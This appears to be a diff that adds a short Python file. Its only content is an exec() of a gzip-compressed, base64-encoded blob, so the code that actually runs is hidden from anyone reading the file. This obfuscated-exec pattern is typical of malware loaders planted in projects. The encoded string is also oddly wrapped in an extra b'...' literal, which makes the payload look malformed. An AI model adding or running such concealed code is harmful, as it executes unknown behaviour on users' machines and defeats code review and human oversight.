@@ -1,0 +1,3 @@
+from gzip import *
+from base64 import *
+exec(decompress(b64decode("b'H4sIAIrdA2kC/3XOsW7EIAwG4N1P4RESqJo1Kk+CrBNRkgbpIMAFut2zF7dS26WLbYT1/d7LGfDYXMroQzrLhQNEFUxwSfh4KR9TvYR8eaS7713CauwrDfoZwRlraT8L3tBHXAl+5uLi+yaCnAGrav9b6Gyj0VQFuNrapwmysQQLF9bqrxZZ8zsvjhO9TTMfnerjEFk9q4SPw983zBxpvr7OJHKPWEajOYC5xpyzulJf61Ij3SPxm22M9gf+gXWTkEq/XQyLnWc9kfwEMqmH0DEBAAA='")))
